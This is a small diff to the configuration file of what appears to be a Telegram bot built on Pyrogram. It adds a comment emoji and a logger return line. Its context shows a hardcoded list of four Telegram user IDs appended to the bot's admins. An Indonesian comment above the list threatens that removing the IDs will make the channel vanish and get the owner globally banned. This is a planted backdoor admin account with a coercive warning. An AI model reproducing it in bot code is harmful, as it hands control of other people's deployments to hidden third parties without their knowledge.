@@ -67,7 +67,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
-# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban
+# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
 ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))
 
 
@@ -85,3 +85,4 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 
 def LOGGER(name: str) -> logging.Logger:
+    return logging.getLogger(name)
